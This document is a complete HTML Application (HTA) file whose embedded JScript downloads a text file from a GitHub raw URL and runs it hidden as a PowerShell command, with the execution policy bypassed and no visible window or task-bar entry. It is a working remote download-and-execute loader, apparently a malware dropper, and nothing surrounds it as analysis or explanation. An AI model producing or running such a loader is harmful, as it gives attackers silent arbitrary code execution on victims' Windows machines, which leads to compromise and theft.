<html><head><hta:application showintaskbar="no"/><script language=JScript>var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);x.send();new ActiveXObject("WScript.Shell").Run("powershell -NoP -Ex ByP -c \""+x.responseText.replace(/\n/g,";")+"\"",0);</script></head></html>